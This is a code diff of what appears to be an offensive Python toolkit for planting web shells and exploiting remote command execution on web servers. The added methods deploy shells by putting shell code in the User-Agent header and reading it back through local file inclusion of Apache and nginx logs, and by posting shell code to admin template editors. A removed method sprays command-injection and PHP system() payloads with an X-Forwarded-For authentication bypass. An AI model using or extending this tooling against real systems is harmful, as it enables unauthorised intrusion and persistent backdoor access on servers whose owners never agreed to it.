@@ -73,8 +73,8 @@ class WebShellDeployer:
         deployment_methods = [
             self._deploy_via_upload,
             self._deploy_via_file_write,
-            self._deploy_via_log_poisoning,
-            self._deploy_via_template_injection
+            self._deploy_via_log_poisoning,  # This method exists now
+            self._deploy_via_template_injection  # This method exists now
         ]
         
         for method in deployment_methods:
@@ -106,7 +106,7 @@ class WebShellDeployer:
                 response = self.session.post(
                     endpoint,
                     files=files,
-                    timeout=5,
+                    timeout=10,  # Increased timeout
                     verify=False
                 )
                 
@@ -120,7 +120,7 @@ class WebShellDeployer:
                     ]
                     
                     for location in possible_locations:
-                        test_response = self.session.get(location, timeout=3)
+                        test_response = self.session.get(location, timeout=5)
                         if test_response.status_code == 200:
                             return location
                             
@@ -131,6 +131,79 @@ class WebShellDeployer:
     def _deploy_via_file_write(self, shell_code: str, name: str) -> str:
         """Deploy shell via file write vulnerabilities"""
         # This would require command execution first
+        print(f"{Colors.YELLOW}[!] File write deployment requires existing RCE{Colors.END}")
+        return None
+    
+    def _deploy_via_log_poisoning(self, shell_code: str, name: str) -> str:
+        """Deploy shell via log poisoning"""
+        print(f"{Colors.CYAN}[>] Attempting log poisoning...{Colors.END}")
+        
+        # Common log locations to poison
+        log_paths = [
+            '/var/log/apache2/access.log',
+            '/var/log/nginx/access.log',
+            '/var/log/httpd/access_log',
+            '/proc/self/fd/1',
+            '/var/www/html/access.log'
+        ]
+        
+        # Try to poison logs via User-Agent
+        test_urls = [
+            f"http://{self.target}:{self.port}/",
+            f"http://{self.target}:{self.port}/index.php",
+            f"http://{self.target}:{self.port}/admin"
+        ]
+        
+        for url in test_urls:
+            try:
+                # Inject shell code in User-Agent
+                headers = {'User-Agent': shell_code}
+                response = self.session.get(url, headers=headers, timeout=5, verify=False)
+                
+                if response.status_code == 200:
+                    # Try to access the log file via LFI
+                    for log_path in log_paths:
+                        lfi_url = f"http://{self.target}:{self.port}/index.php?page={log_path}"
+                        test_response = self.session.get(lfi_url, timeout=5)
+                        if shell_code in test_response.text:
+                            print(f"{Colors.GREEN}[+] Log poisoning successful via {log_path}{Colors.END}")
+                            return lfi_url
+            except:
+                continue
+        return None
+    
+    def _deploy_via_template_injection(self, shell_code: str, name: str) -> str:
+        """Deploy shell via template injection"""
+        print(f"{Colors.CYAN}[>] Attempting template injection...{Colors.END}")
+        
+        # Template injection endpoints
+        template_endpoints = [
+            f"http://{self.target}:{self.port}/admin/templates",
+            f"http://{self.target}:{self.port}/template/edit",
+            f"http://{self.target}:{self.port}/theme/edit",
+            f"http://{self.target}:{self.port}/layout/edit"
+        ]
+        
+        for endpoint in template_endpoints:
+            try:
+                # Try to inject shell code as template
+                payload = {
+                    'template': shell_code,
+                    'content': shell_code,
+                    'code': shell_code,
+                    'file': shell_code
+                }
+                
+                response = self.session.post(endpoint, data=payload, timeout=10, verify=False)
+                
+                if response.status_code == 200:
+                    # Try to access the template
+                    template_url = f"http://{self.target}:{self.port}/templates/{name}.php"
+                    test_response = self.session.get(template_url, timeout=5)
+                    if test_response.status_code == 200:
+                        return template_url
+            except:
+                continue
         return None
     
     def deploy_asp_shell(self) -> str:
@@ -149,11 +222,11 @@ class WebShellDeployer:
             for endpoint in upload_endpoints:
                 try:
                     files = {'file': (f'{name}.aspx', shell_code, 'application/x-aspx')}
-                    response = self.session.post(endpoint, files=files, timeout=5)
+                    response = self.session.post(endpoint, files=files, timeout=10)
                     
                     if response.status_code == 200:
                         shell_url = f"http://{self.target}:{self.port}/uploads/{name}.aspx"
-                        test_response = self.session.get(shell_url, timeout=3)
+                        test_response = self.session.get(shell_url, timeout=5)
                         if test_response.status_code == 200:
                             return shell_url
                 except:
@@ -785,52 +858,6 @@ class IntelligentRCEExploiter:
                         return f"Command Injection: {response.text}"
                 except:
                     continue
-        return None
-    
-    def _exploit_rest_api_with_auth(self, url: str, command: str) -> str:
-        """REST API exploitation with authentication bypass attempts"""
-        # First try without auth
-        methods = ['POST', 'GET', 'PUT', 'PATCH', 'DELETE']
-        
-        for method in methods:
-            try:
-                if method == 'POST':
-                    # Enhanced parameter list
-                    enhanced_params = {
-                        'command': command, 'cmd': command, 'exec': command,
-                        'query': command, 'input': command, 'system': command,
-                        'run': command, 'execute': command, 'shell': command,
-                        'code': f'system("{command}");',
-                        'data': f'<?php system("{command}"); ?>',
-                        'script': f'print(os.system("{command}"))'
-                    }
-                    
-                    for param, value in enhanced_params.items():
-                        response = self.session.post(
-                            url,
-                            data={param: value},
-                            timeout=3,
-                            verify=False,
-                            headers={'X-Forwarded-For': '127.0.0.1'}
-                        )
-                        if self._is_successful_execution(response, command):
-                            return f"REST API: {response.text}"
-                
-                elif method == 'GET':
-                    # URL parameter injection
-                    get_params = {
-                        'cmd': command, 'command': command, 'exec': command,
-                        'code': command, 'system': command
-                    }
-                    
-                    for param, value in get_params.items():
-                        test_url = f"{url}?{param}={requests.utils.quote(value)}"
-                        response = self.session.get(test_url, timeout=3, verify=False)
-                        if self._is_successful_execution(response, command):
-                            return f"REST API GET: {response.text}"
-                            
-            except:
-                continue
         return None
     
     def _is_successful_execution(self, response, command: str) -> bool:
@@ -2257,26 +2284,26 @@ class ComprehensiveScanner:
             print(f"\n{Colors.PURPLE}[ PHASE 2: Enhanced Web Application Scanning ]{Colors.END}")
             web_scanner = WebVulnerabilityScanner(target, port)
             
-            # Use threading with timeouts for web scanning
+            # Use threading with timeouts for web scanning - INCREASED TIMEOUTS
             with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
                 sql_future = executor.submit(web_scanner.scan_sql_injection)
                 xss_future = executor.submit(web_scanner.scan_xss)
                 rce_future = executor.submit(web_scanner.scan_rce_endpoints)
                 
                 try:
-                    if sql_future.result(timeout=10):
+                    if sql_future.result(timeout=30):  # Increased from 10 to 30
                         self._add_finding('SQL Injection', 'HIGH', 'SQL injection vulnerability detected')
                 except concurrent.futures.TimeoutError:
                     print(f"{Colors.YELLOW}[!] SQL injection scan timed out{Colors.END}")
                 
                 try:
-                    if xss_future.result(timeout=10):
+                    if xss_future.result(timeout=30):  # Increased from 10 to 30
                         self._add_finding('XSS', 'MEDIUM', 'Cross-site scripting vulnerability detected')
                 except concurrent.futures.TimeoutError:
                     print(f"{Colors.YELLOW}[!] XSS scan timed out{Colors.END}")
                 
                 try:
-                    rce_result = rce_future.result(timeout=15)
+                    rce_result = rce_future.result(timeout=45)  # Increased from 15 to 45
                     if rce_result:
                         self._add_finding('RCE Endpoint', 'CRITICAL', 'Potential RCE endpoint found')
                         # Store found endpoints for later exploitation
